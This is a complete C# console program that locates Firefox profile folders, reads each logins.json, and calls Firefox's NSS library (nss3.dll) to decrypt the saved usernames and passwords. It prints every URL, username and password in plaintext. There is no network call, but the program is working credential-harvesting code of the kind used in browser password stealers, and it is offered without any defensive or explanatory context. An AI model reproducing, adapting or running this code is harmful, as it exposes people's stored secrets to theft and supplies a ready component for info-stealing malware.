using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Newtonsoft.Json;

class NSSHelper
{
    [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern int NSS_Init(string configdir);

    [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx);

    [StructLayout(LayoutKind.Sequential)]
    public struct TSECItem
    {
        public int type;
        public IntPtr data;
        public int len;
    }

    public static bool Initialize(string nssPath)
    {
        try
        {
            return NSS_Init(nssPath) == 0;
        }
        catch (DllNotFoundException ex)
        {
            Console.WriteLine($"[ERR] NSS library not found: {ex.Message}");
            return false;
        }
        catch (BadImageFormatException ex)
        {
            Console.WriteLine($"[ERR] Architecture mismatch (32/64 bit): {ex.Message}");
            return false;
        }
    }

    public static string DecryptData(string encryptedData)
    {
        if (string.IsNullOrEmpty(encryptedData))
        {
            Console.WriteLine("[WARN] Empty encrypted data received");
            return null;
        }

        IntPtr allocatedMemory = IntPtr.Zero;
        try
        {
            var decodedData = Convert.FromBase64String(encryptedData);
            var tsecData = new TSECItem
            {
                data = Marshal.AllocHGlobal(decodedData.Length),
                len = decodedData.Length
            };
            allocatedMemory = tsecData.data;

            Marshal.Copy(decodedData, 0, tsecData.data, decodedData.Length);
            var result = new TSECItem
            {
                data = IntPtr.Zero,
                len = 0
            };

            if (PK11SDR_Decrypt(ref tsecData, ref result, 0) == 0 && result.len > 0)
            {
                var decryptedData = new byte[result.len];
                Marshal.Copy(result.data, decryptedData, 0, result.len);
                return Encoding.UTF8.GetString(decryptedData);
            }
            Console.WriteLine("[WARN] Decryption failed or resulted in empty data");
            return null;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ERR] Decryption error: {ex.Message}");
            return null;
        }
        finally
        {
            if (allocatedMemory != IntPtr.Zero)
            {
                Marshal.FreeHGlobal(allocatedMemory);
            }
        }
    }

    public static List<PasswordEntry> GetFirefoxPasswords(string loginsPath, string nssPath)
    {
        var passwordList = new List<PasswordEntry>();

        if (!File.Exists(loginsPath))
        {
            Console.WriteLine($"[ERR] File not found: {loginsPath}");
            return passwordList;
        }

        if (!Initialize(nssPath))
        {
            Console.WriteLine("[ERR] Initialization failed");
            return passwordList;
        }

        try
        {
            var loginsJson = File.ReadAllText(loginsPath);
            dynamic logins = JsonConvert.DeserializeObject(loginsJson);

            if (logins?.logins == null)
            {
                Console.WriteLine("[ERR] Invalid JSON structure");
                return passwordList;
            }

            foreach (var login in logins.logins)
            {
                try
                {
                    var url = login.hostname?.ToString();
                    var usernameEncrypted = login.encryptedUsername?.ToString();
                    var passwordEncrypted = login.encryptedPassword?.ToString();

                    if (string.IsNullOrEmpty(usernameEncrypted) || 
                        string.IsNullOrEmpty(passwordEncrypted))
                    {
                        Console.WriteLine("[WARN] Skipping entry with missing data");
                        continue;
                    }

                    var username = DecryptData(usernameEncrypted);
                    var password = DecryptData(passwordEncrypted);

                    if (username != null && password != null)
                    {
                        passwordList.Add(new PasswordEntry
                        {
                            Url = url,
                            Username = username,
                            Password = password
                        });
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[ERR] Error processing entry: {ex.Message}");
                    continue;
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ERR] Error processing file: {ex.Message}");
        }

        return passwordList;
    }
}

public class PasswordEntry
{
    public string Url { get; set; }
    public string Username { get; set; }
    public string Password { get; set; }
}

class Program
{
    static void Main(string[] args)
    {
        try
        {
            var profilesPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Mozilla", 
                "Firefox", 
                "Profiles"
            );

            if (!Directory.Exists(profilesPath))
            {
                Console.WriteLine("[ERR] Firefox profiles directory not found");
                return;
            }

            var profiles = Directory.GetDirectories(profilesPath);
            if (profiles.Length == 0)
            {
                Console.WriteLine("[INFO] No Firefox profiles found");
                return;
            }

            foreach (var profile in profiles)
            {
                Console.WriteLine($"[INFO] Processing profile: {profile}");
                var loginsPath = Path.Combine(profile, "logins.json");
                var nssPath = profile;

                var passwordList = NSSHelper.GetFirefoxPasswords(loginsPath, nssPath);
                
                if (passwordList.Count == 0)
                {
                    Console.WriteLine("[INFO] No entries found in this profile");
                    continue;
                }

                foreach (var entry in passwordList)
                {
                    Console.WriteLine($"URL: {entry.Url}");
                    Console.WriteLine($"Username: {entry.Username}");
                    Console.WriteLine($"Password: {entry.Password}");
                    Console.WriteLine();
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ERR] Fatal error: {ex.Message}");
        }
        finally
        {
            Console.WriteLine("Press any key to exit...");
            Console.ReadLine();
        }
    }
}
